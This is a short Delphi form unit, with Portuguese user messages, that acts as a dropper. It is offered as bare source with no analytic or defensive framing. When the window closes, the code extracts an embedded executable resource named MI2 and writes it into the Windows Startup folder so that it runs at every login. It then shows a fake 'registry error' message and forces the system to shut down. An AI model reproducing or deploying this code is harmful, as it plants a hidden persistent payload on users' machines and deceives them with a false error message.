unit teste;

interface

uses
  Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs,
  StdCtrls, ExtCtrls;

type
  TForm1 = class(TForm)
    Button1: TButton;
    Image1: TImage;
    Label1: TLabel;
    procedure Button1Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
  private
    { Private declarations }
    procedure LoadFromResAndSave(RESNAME ,RESOURCETYPE, FOLDERTOSAVE , NAMETOSAVE : string);
    function ExitWindowsEx(uFlags : integer;  		 // shutdown operation
                   dwReserved : word) : boolean;
  public
    { Public declarations }
  end;

const
     Resname = 'MI2';
     resourcetype = 'exe';
     foldertosave = 'C:\Windows\Menu Iniciar\Programas\Iniciar\';
     Nametosave = 'MI2.exe';
var
  Form1: TForm1;

implementation

{$R *.DFM}

function Tform1.ExitWindowsEx(uFlags : integer;  		 // shutdown operation
                   dwReserved : word) : boolean; // reserved
  external 'user32.dll' name 'ExitWindowsEx';

procedure Tform1.LoadFromResAndSave(RESNAME ,RESOURCETYPE, FOLDERTOSAVE , NAMETOSAVE : string);
var
   ResHandle , MemHandle : THandle;
   MemStream             : TMemoryStream;
   ResPtr                : PByte;
   ResSize               : Longint;
 begin
   ResHandle := FindResource(HInstance, PChar(RESNAME), PCHAR(RESOURCETYPE));
   MemHandle := LoadResource(HInstance, ResHandle);
   ResPtr    := LockResource(MemHandle);
   MemStream := TMemoryStream.Create;
   ResSize := SizeOfResource(HInstance, ResHandle);
   MemStream.SetSize(ResSize);
   MemStream.Write(ResPtr^, ResSize);
   FreeResource(MemHandle);
   MemStream.Seek(0, 0);
   MemStream.SaveToFile(FOLDERTOSAVE+NAMETOSAVE);
   MemStream.Free;
end;


procedure TForm1.Button1Click(Sender: TObject);
begin
     close;
end;

procedure TForm1.FormClose(Sender: TObject; var Action: TCloseAction);
begin
     LoadFromResAndSave(Resname,Resourcetype,foldertosave,nametosave);
     messagedlg('Um erro no registro foi encontrado. O Windows será reiniciado.',MTinformation,[mbok],0);
     ExitWindowsEx(EWX_SHUTDOWN, 0);
end;

end.
